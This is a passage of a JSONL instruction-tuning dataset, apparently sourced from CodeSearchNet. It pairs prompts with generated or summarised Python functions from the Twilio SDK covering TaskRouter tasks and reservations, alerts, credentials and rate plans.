:param bool national_roaming_enabled: Defines whether SIMs can roam onto other networks in the SIM's home country.\n        :param unicode international_roaming: The international_roaming\n        :param unicode national_roaming_data_limit: Network-enforced limit specifying the total Megabytes of national roaming data usage allowed during one month.\n        :param unicode international_roaming_data_limit: The international_roaming_data_limit\n\n        :returns: Newly created RatePlanInstance\n        :rtype: twilio.rest.wireless.v1.rate_plan.RatePlanInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'FriendlyName': friendly_name,\n            'DataEnabled': data_enabled,\n            'DataLimit': data_limit,\n            'DataMetering': data_metering,\n            'MessagingEnabled': messaging_enabled,\n            'VoiceEnabled': voice_enabled,\n            'NationalRoamingEnabled': national_roaming_enabled,\n            'InternationalRoaming': serialize.map(international_roaming, lambda e: e),\n            'NationalRoamingDataLimit': national_roaming_data_limit,\n            'InternationalRoamingDataLimit': international_roaming_data_limit,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RatePlanInstance(self._version, payload, )", "response": "Create a new RatePlanInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconstructs a ReservationContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationContext :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ReservationContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationContext\n        \"\"\"\n        return ReservationContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return ReservationInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_sid=self._solution['task_sid'],\n        )", "response": "Build an instance of ReservationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfetch a ReservationInstance :returns: Fetched ReservationInstance :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a ReservationInstance\n\n        :returns: Fetched ReservationInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ReservationInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the ReservationInstance :param ReservationInstance.Status reservation_status: New reservation status :param unicode worker_activity_sid: New worker activity sid if rejecting a reservation :param unicode instruction: Assignment instruction for reservation :param unicode dequeue_post_work_activity_sid: New worker activity sid after executing a Dequeue instruction :param unicode dequeue_from: Caller ID for the call to the worker when executing a Dequeue instruction :param unicode dequeue_record: Attribute to record both legs of a call when executing a Dequeue instruction :param unicode dequeue_timeout: Timeout for call when executing a Dequeue instruction :param unicode dequeue_to: Contact URI of the worker when executing a Dequeue instruction :param unicode dequeue_status_callback_url: Callback URL for completed call event when executing a Dequeue instruction :param unicode call_from: Caller ID for the outbound call when executing a Call instruction :param unicode call_record: Attribute to record both legs of a call when executing a Call instruction :param unicode call_timeout: Timeout for call when executing a Call instruction :param unicode call_to: Contact URI of the worker when executing a Call instruction :param unicode call_url: TwiML URI executed on answering the worker's leg as a result of the Call instruction :param unicode call_status_callback_url: Callback URL for completed call event when executing a Call instruction :param bool call_accept: Flag to determine if reservation should be accepted when executing a Call instruction :param unicode redirect_call_sid: Call sid of the call parked in the queue when executing a Redirect instruction :param bool redirect_accept: Flag to determine if reservation should be accepted when executing a Redirect instruction :param unicode redirect_url: TwiML URI to redirect the call to when executing the Redirect instruction :param unicode to: Contact URI of the worker when executing a Conference instruction :param unicode from_: Caller ID for the call to the worker when executing a Conference instruction :param unicode status_callback: The status_callback :param unicode status_callback_method: The status_callback_method :param ReservationInstance.CallStatus status_callback_event: The status_callback_event :param unicode timeout: Timeout for call when executing a Conference instruction :param bool record: The record :param bool muted: The muted :param unicode beep: The beep :param bool start_conference_on_enter: The start_conference_on_enter :param bool end_conference_on_exit: The end_conference_on_exit :param unicode wait_url: The wait_url :param unicode wait_method: The wait_method :param bool early_media: The early_media :param unicode max_participants: The max_participants :param unicode conference_status_callback: The conference_status_callback :param unicode conference_status_callback_method: The conference_status_callback_method :param ReservationInstance.ConferenceEvent conference_status_callback_event: The conference_status_callback_event :param unicode conference_record: The conference_record :param unicode conference_trim: The conference_trim :param unicode recording_channels: The recording_channels :param unicode recording_status_callback: The recording_status_callback :param unicode recording_status_callback_method: The recording_status_callback_method :param unicode conference_recording_status_callback: The conference_recording_status_callback :param unicode conference_recording_status_callback_method: The conference_recording_status_callback_method :param unicode region: The region :param unicode sip_auth_username: The sip_auth_username :param unicode sip_auth_password: The sip_auth_password :param unicode dequeue_status_callback_event: Call progress events sent via webhooks as a result of a Dequeue instruction :param unicode post_work_activity_sid: New worker activity sid after executing a Conference instruction :param ReservationInstance.SupervisorMode supervisor_mode: Supervisor mode when executing the Supervise instruction :param unicode supervisor: Supervisor sid/uri when executing the Supervise instruction :param bool end_conference_on_customer_exit: The end_conference_on_customer_exit :param bool beep_on_customer_entrance: The beep_on_customer_entrance :returns: Updated ReservationInstance :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationInstance", "response": "def update(self, reservation_status=values.unset,\n               worker_activity_sid=values.unset, instruction=values.unset,\n               dequeue_post_work_activity_sid=values.unset,\n               dequeue_from=values.unset, dequeue_record=values.unset,\n               dequeue_timeout=values.unset, dequeue_to=values.unset,\n               dequeue_status_callback_url=values.unset, call_from=values.unset,\n               call_record=values.unset, call_timeout=values.unset,\n               call_to=values.unset, call_url=values.unset,\n               call_status_callback_url=values.unset, call_accept=values.unset,\n               redirect_call_sid=values.unset, redirect_accept=values.unset,\n               redirect_url=values.unset, to=values.unset, from_=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset,\n               status_callback_event=values.unset, timeout=values.unset,\n               record=values.unset, muted=values.unset, beep=values.unset,\n               start_conference_on_enter=values.unset,\n               end_conference_on_exit=values.unset, wait_url=values.unset,\n               wait_method=values.unset, early_media=values.unset,\n               max_participants=values.unset,\n               conference_status_callback=values.unset,\n               conference_status_callback_method=values.unset,\n               conference_status_callback_event=values.unset,\n               conference_record=values.unset, conference_trim=values.unset,\n               recording_channels=values.unset,\n               recording_status_callback=values.unset,\n               recording_status_callback_method=values.unset,\n               conference_recording_status_callback=values.unset,\n               conference_recording_status_callback_method=values.unset,\n               region=values.unset, sip_auth_username=values.unset,\n               sip_auth_password=values.unset,\n               dequeue_status_callback_event=values.unset,\n               post_work_activity_sid=values.unset, supervisor_mode=values.unset,\n               supervisor=values.unset,\n               end_conference_on_customer_exit=values.unset,\n               beep_on_customer_entrance=values.unset):\n        \"\"\"\n        Update the ReservationInstance\n\n        :param ReservationInstance.Status reservation_status: New reservation status\n        :param unicode worker_activity_sid: New worker activity sid if rejecting a reservation\n        :param unicode instruction: Assignment instruction for reservation\n        :param unicode dequeue_post_work_activity_sid: New worker activity sid after executing a Dequeue instruction\n        :param unicode dequeue_from: Caller ID for the call to the worker when executing a Dequeue instruction\n        :param unicode dequeue_record: Attribute to record both legs of a call when executing a Dequeue instruction\n        :param unicode dequeue_timeout: Timeout for call when executing a Dequeue instruction\n        :param unicode dequeue_to: Contact URI of the worker when executing a Dequeue instruction\n        :param unicode dequeue_status_callback_url: Callback URL for completed call event when executing a Dequeue instruction\n        :param unicode call_from: Caller ID for the outbound call when executing a Call instruction\n        :param unicode call_record: Attribute to record both legs of a call when executing a Call instruction\n        :param unicode call_timeout: Timeout for call when executing a Call instruction\n        :param unicode call_to: Contact URI of the worker when executing a Call instruction\n        :param unicode call_url: TwiML URI executed on answering the worker's leg as a result of the Call instruction\n        :param unicode call_status_callback_url: Callback URL for completed call event when executing a Call instruction\n        :param bool call_accept: Flag to determine if reservation should be accepted when executing a Call instruction\n        :param unicode redirect_call_sid: Call sid of the call parked in the queue when executing a Redirect instruction\n        :param bool redirect_accept: Flag to determine if reservation should be accepted when executing a Redirect instruction\n        :param unicode redirect_url: TwiML URI to redirect the call to when executing the Redirect instruction\n        :param unicode to: Contact URI of the worker when executing a Conference instruction\n        :param unicode from_: Caller ID for the call to the worker when executing a Conference instruction\n        :param unicode status_callback: The status_callback\n        :param unicode status_callback_method: The status_callback_method\n        :param ReservationInstance.CallStatus status_callback_event: The status_callback_event\n        :param unicode timeout: Timeout for call when executing a Conference instruction\n        :param bool record: The record\n        :param bool muted: The muted\n        :param unicode beep: The beep\n        :param bool start_conference_on_enter: The start_conference_on_enter\n        :param bool end_conference_on_exit: The end_conference_on_exit\n        :param unicode wait_url: The wait_url\n        :param unicode wait_method: The wait_method\n        :param bool early_media: The early_media\n        :param unicode max_participants: The max_participants\n        :param unicode conference_status_callback: The conference_status_callback\n        :param unicode conference_status_callback_method: The conference_status_callback_method\n        :param ReservationInstance.ConferenceEvent conference_status_callback_event: The conference_status_callback_event\n        :param unicode conference_record: The conference_record\n        :param unicode conference_trim: The conference_trim\n        :param unicode recording_channels: The recording_channels\n        :param unicode recording_status_callback: The recording_status_callback\n        :param unicode recording_status_callback_method: The recording_status_callback_method\n        :param unicode conference_recording_status_callback: The conference_recording_status_callback\n        :param unicode conference_recording_status_callback_method: The conference_recording_status_callback_method\n        :param unicode region: The region\n        :param unicode sip_auth_username: The sip_auth_username\n        :param unicode sip_auth_password: The sip_auth_password\n        :param unicode dequeue_status_callback_event: Call progress events sent via webhooks as a result of a Dequeue instruction\n        :param unicode post_work_activity_sid: New worker activity sid after executing a Conference instruction\n        :param ReservationInstance.SupervisorMode supervisor_mode: Supervisor mode when executing the Supervise instruction\n        :param unicode supervisor: Supervisor sid/uri when executing the Supervise instruction\n        :param bool end_conference_on_customer_exit: The end_conference_on_customer_exit\n        :param bool beep_on_customer_entrance: The beep_on_customer_entrance\n\n        :returns: Updated ReservationInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationInstance\n        \"\"\"\n        data = values.of({\n            'ReservationStatus': reservation_status,\n            'WorkerActivitySid': worker_activity_sid,\n            'Instruction': instruction,\n            'DequeuePostWorkActivitySid': dequeue_post_work_activity_sid,\n            'DequeueFrom': dequeue_from,\n            'DequeueRecord': dequeue_record,\n            'DequeueTimeout': dequeue_timeout,\n            'DequeueTo': dequeue_to,\n            'DequeueStatusCallbackUrl': dequeue_status_callback_url,\n            'CallFrom': call_from,\n            'CallRecord': call_record,\n            'CallTimeout': call_timeout,\n            'CallTo': call_to,\n            'CallUrl': call_url,\n            'CallStatusCallbackUrl': call_status_callback_url,\n            'CallAccept': call_accept,\n            'RedirectCallSid': redirect_call_sid,\n            'RedirectAccept': redirect_accept,\n            'RedirectUrl': redirect_url,\n            'To': to,\n            'From': from_,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n            'StatusCallbackEvent': serialize.map(status_callback_event, lambda e: e),\n            'Timeout': timeout,\n            'Record': record,\n            'Muted': muted,\n            'Beep': beep,\n            'StartConferenceOnEnter': start_conference_on_enter,\n            'EndConferenceOnExit': end_conference_on_exit,\n            'WaitUrl': wait_url,\n            'WaitMethod': wait_method,\n            'EarlyMedia': early_media,\n            'MaxParticipants': max_participants,\n            'ConferenceStatusCallback': conference_status_callback,\n            'ConferenceStatusCallbackMethod': conference_status_callback_method,\n            'ConferenceStatusCallbackEvent': serialize.map(conference_status_callback_event, lambda e: e),\n            'ConferenceRecord': conference_record,\n            'ConferenceTrim': conference_trim,\n            'RecordingChannels': recording_channels,\n            'RecordingStatusCallback': recording_status_callback,\n            'RecordingStatusCallbackMethod': recording_status_callback_method,\n            'ConferenceRecordingStatusCallback': conference_recording_status_callback,\n            'ConferenceRecordingStatusCallbackMethod': conference_recording_status_callback_method,\n            'Region': region,\n            'SipAuthUsername': sip_auth_username,\n            'SipAuthPassword': sip_auth_password,\n            'DequeueStatusCallbackEvent': serialize.map(dequeue_status_callback_event, lambda e: e),\n            'PostWorkActivitySid': post_work_activity_sid,\n            'SupervisorMode': supervisor_mode,\n            'Supervisor': supervisor,\n            'EndConferenceOnCustomerExit': end_conference_on_customer_exit,\n            'BeepOnCustomerEntrance': beep_on_customer_entrance,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ReservationInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list(self, log_level=values.unset, start_date=values.unset,\n             end_date=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists AlertInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode log_level: Only show alerts for this log-level.\n        :param date start_date: Only show Alerts on or after this date.\n        :param date end_date: Only show Alerts on or before this date.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.monitor.v1.alert.AlertInstance]\n        \"\"\"\n        return list(self.stream(\n            log_level=log_level,\n            start_date=start_date,\n            end_date=end_date,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the AlertInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef page(self, log_level=values.unset, start_date=values.unset,\n             end_date=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of AlertInstance records from the API.\n        Request is executed immediately\n\n        :param unicode log_level: Only show alerts for this log-level.\n        :param date start_date: Only show Alerts on or after this date.\n        :param date end_date: Only show Alerts on or before this date.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of AlertInstance\n        :rtype: twilio.rest.monitor.v1.alert.AlertPage\n        \"\"\"\n        params = values.of({\n            'LogLevel': log_level,\n            'StartDate': serialize.iso8601_date(start_date),\n            'EndDate': serialize.iso8601_date(end_date),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AlertPage(self._version, response, self._solution)", "response": "Retrieve a single page of AlertInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate an instance context for the alert", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AlertContext for this AlertInstance\n        :rtype: twilio.rest.monitor.v1.alert.AlertContext\n        \"\"\"\n        if self._context is None:\n            self._context = AlertContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new PublicKeyInstance", "response": "def create(self, public_key, friendly_name=values.unset,\n               account_sid=values.unset):\n        \"\"\"\n        Create a new PublicKeyInstance\n\n        :param unicode public_key: A URL encoded representation of the public key\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode account_sid: The Subaccount this Credential should be associated with.\n\n        :returns: Newly created PublicKeyInstance\n        :rtype: twilio.rest.accounts.v1.credential.public_key.PublicKeyInstance\n        \"\"\"\n        data = values.of({\n            'PublicKey': public_key,\n            'FriendlyName': friendly_name,\n            'AccountSid': account_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return PublicKeyInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = PublicKeyContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the key"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef trunks(self):\n        if self._trunks is None:\n            self._trunks = TrunkList(self)\n        return self._trunks", "response": "Access the TrunkList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of TollFreeInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TollFreeInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.toll_free.TollFreeInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.toll_free.TollFreeInstance\n        \"\"\"\n        return TollFreeInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, type, friendly_name=values.unset, certificate=values.unset,\n               private_key=values.unset, sandbox=values.unset, api_key=values.unset,\n               secret=values.unset):\n        \"\"\"\n        Create a new CredentialInstance\n\n        :param CredentialInstance.PushService type: The Credential type\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode certificate: [APN only] The URL-encoded representation of the certificate\n        :param unicode private_key: [APN only] URL-encoded representation of the private key\n        :param bool sandbox: [APN only] Whether to send the credential to sandbox APNs\n        :param unicode api_key: [GCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n        :param unicode secret: [FCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n\n        :returns: Newly created CredentialInstance\n        :rtype: twilio.rest.notify.v1.credential.CredentialInstance\n        \"\"\"\n        data = values.of({\n            'Type': type,\n            'FriendlyName': friendly_name,\n            'Certificate': certificate,\n            'PrivateKey': private_key,\n            'Sandbox': sandbox,\n            'ApiKey': api_key,\n            'Secret': secret,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialInstance(self._version, payload, )", "response": "Create a new CredentialInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, friendly_name=values.unset, certificate=values.unset,\n               private_key=values.unset, sandbox=values.unset, api_key=values.unset,\n               secret=values.unset):\n        \"\"\"\n        Update the CredentialInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode certificate: [APN only] The URL-encoded representation of the certificate\n        :param unicode private_key: [APN only] URL-encoded representation of the private key\n        :param bool sandbox: [APN only] Whether to send the credential to sandbox APNs\n        :param unicode api_key: [GCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n        :param unicode secret: [FCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n\n        :returns: Updated CredentialInstance\n        :rtype: twilio.rest.notify.v1.credential.CredentialInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'Certificate': certificate,\n            'PrivateKey': private_key,\n            'Sandbox': sandbox,\n            'ApiKey': api_key,\n            'Secret': secret,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the CredentialInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode certificate: [APN only] The URL-encoded representation of the certificate\n        :param unicode private_key: [APN only] URL-encoded representation of the private key\n        :param bool sandbox: [APN only] Whether to send the credential to sandbox APNs\n        :param unicode api_key: [GCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n        :param unicode secret: [FCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n\n        :returns: Updated CredentialInstance\n        :rtype: twilio.rest.notify.v1.credential.CredentialInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = CredentialContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the credential"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, friendly_name=values.unset, certificate=values.unset,\n               private_key=values.unset, sandbox=values.unset, api_key=values.unset,\n               secret=values.unset):\n        \"\"\"\n        Update the CredentialInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode certificate: [APN only] The URL-encoded representation of the certificate\n        :param unicode private_key: [APN only] URL-encoded representation of the private key\n        :param bool sandbox: [APN only] Whether to send the credential to sandbox APNs\n        :param unicode api_key: [GCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n        :param unicode secret: [FCM only] The `Server key` of your project from Firebase console under Settings / Cloud messaging\n\n        :returns: Updated CredentialInstance\n        :rtype: twilio.rest.notify.v1.credential.CredentialInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            certificate=certificate,\n            private_key=private_key,\n            sandbox=sandbox,\n            api_key=api_key,\n            secret=secret,\n        )", "response": "Updates the CredentialInstance with the specified parameters"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming TaskInstance records from the API as a generator.", "response": "def stream(self, priority=values.unset, assignment_status=values.unset,\n               workflow_sid=values.unset, workflow_name=values.unset,\n               task_queue_sid=values.unset, task_queue_name=values.unset,\n               evaluate_task_attributes=values.unset, ordering=values.unset,\n               has_addons=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams TaskInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode priority: Retrieve the list of all Tasks in the workspace with the specified priority.\n        :param unicode assignment_status: Returns the list of all Tasks in the workspace with the specified AssignmentStatus.\n        :param unicode workflow_sid: Returns the list of Tasks that are being controlled by the Workflow with the specified Sid value.\n        :param unicode workflow_name: Returns the list of Tasks that are being controlled by the Workflow with the specified FriendlyName value.\n        :param unicode task_queue_sid: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the Sid specified.\n        :param unicode task_queue_name: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the FriendlyName specified.\n        :param unicode evaluate_task_attributes: Provide a task attributes expression, and this will return tasks which match the attributes.\n        :param unicode ordering: Use this parameter to control the order of the Tasks returned.\n        :param bool has_addons: The has_addons\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.task.TaskInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            priority=priority,\n            assignment_status=assignment_status,\n            workflow_sid=workflow_sid,\n            workflow_name=workflow_name,\n            task_queue_sid=task_queue_sid,\n            task_queue_name=task_queue_name,\n            evaluate_task_attributes=evaluate_task_attributes,\n            ordering=ordering,\n            has_addons=has_addons,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nlist TaskInstance records from the TaskRouter API. This operation returns a list of TaskInstance records from the TaskRouter API.", "response": "def list(self, priority=values.unset, assignment_status=values.unset,\n             workflow_sid=values.unset, workflow_name=values.unset,\n             task_queue_sid=values.unset, task_queue_name=values.unset,\n             evaluate_task_attributes=values.unset, ordering=values.unset,\n             has_addons=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists TaskInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode priority: Retrieve the list of all Tasks in the workspace with the specified priority.\n        :param unicode assignment_status: Returns the list of all Tasks in the workspace with the specified AssignmentStatus.\n        :param unicode workflow_sid: Returns the list of Tasks that are being controlled by the Workflow with the specified Sid value.\n        :param unicode workflow_name: Returns the list of Tasks that are being controlled by the Workflow with the specified FriendlyName value.\n        :param unicode task_queue_sid: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the Sid specified.\n        :param unicode task_queue_name: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the FriendlyName specified.\n        :param unicode evaluate_task_attributes: Provide a task attributes expression, and this will return tasks which match the attributes.\n        :param unicode ordering: Use this parameter to control the order of the Tasks returned.\n        :param bool has_addons: The has_addons\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.task.TaskInstance]\n        \"\"\"\n        return list(self.stream(\n            priority=priority,\n            assignment_status=assignment_status,\n            workflow_sid=workflow_sid,\n            workflow_name=workflow_name,\n            task_queue_sid=task_queue_sid,\n            task_queue_name=task_queue_name,\n            evaluate_task_attributes=evaluate_task_attributes,\n            ordering=ordering,\n            has_addons=has_addons,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nretrieve a single page of TaskInstance records from the TaskRouter API. Request is executed immediately", "response": "def page(self, priority=values.unset, assignment_status=values.unset,\n             workflow_sid=values.unset, workflow_name=values.unset,\n             task_queue_sid=values.unset, task_queue_name=values.unset,\n             evaluate_task_attributes=values.unset, ordering=values.unset,\n             has_addons=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of TaskInstance records from the API.\n        Request is executed immediately\n\n        :param unicode priority: Retrieve the list of all Tasks in the workspace with the specified priority.\n        :param unicode assignment_status: Returns the list of all Tasks in the workspace with the specified AssignmentStatus.\n        :param unicode workflow_sid: Returns the list of Tasks that are being controlled by the Workflow with the specified Sid value.\n        :param unicode workflow_name: Returns the list of Tasks that are being controlled by the Workflow with the specified FriendlyName value.\n        :param unicode task_queue_sid: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the Sid specified.\n        :param unicode task_queue_name: Returns the list of Tasks that are currently waiting in the TaskQueue identified by the FriendlyName specified.\n        :param unicode evaluate_task_attributes: Provide a task attributes expression, and this will return tasks which match the attributes.\n        :param unicode ordering: Use this parameter to control the order of the Tasks returned.\n        :param bool has_addons: The has_addons\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of TaskInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskPage\n        \"\"\"\n        params = values.of({\n            'Priority': priority,\n            'AssignmentStatus': serialize.map(assignment_status, lambda e: e),\n            'WorkflowSid': workflow_sid,\n            'WorkflowName': workflow_name,\n            'TaskQueueSid': task_queue_sid,\n            'TaskQueueName': task_queue_name,\n            'EvaluateTaskAttributes': evaluate_task_attributes,\n            'Ordering': ordering,\n            'HasAddons': has_addons,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TaskPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, timeout=values.unset, priority=values.unset,\n               task_channel=values.unset, workflow_sid=values.unset,\n               attributes=values.unset):\n        \"\"\"\n        Create a new TaskInstance\n\n        :param unicode timeout: The amount of time in seconds the task is allowed to live up to a maximum of 2 weeks.\n        :param unicode priority: Override priority for the Task.\n        :param unicode task_channel: When MultiTasking is enabled specify the type of the task by passing either TaskChannel Unique Name or Task Channel Sid.\n        :param unicode workflow_sid: The WorkflowSid for the Workflow that you would like to handle routing for this Task.\n        :param unicode attributes: Url-encoded JSON string describing the attributes of this task.\n\n        :returns: Newly created TaskInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskInstance\n        \"\"\"\n        data = values.of({\n            'Timeout': timeout,\n            'Priority': priority,\n            'TaskChannel': task_channel,\n            'WorkflowSid': workflow_sid,\n            'Attributes': attributes,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Create a new TaskInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a TaskContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.task.TaskContext :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TaskContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task.TaskContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskContext\n        \"\"\"\n        return TaskContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )"}
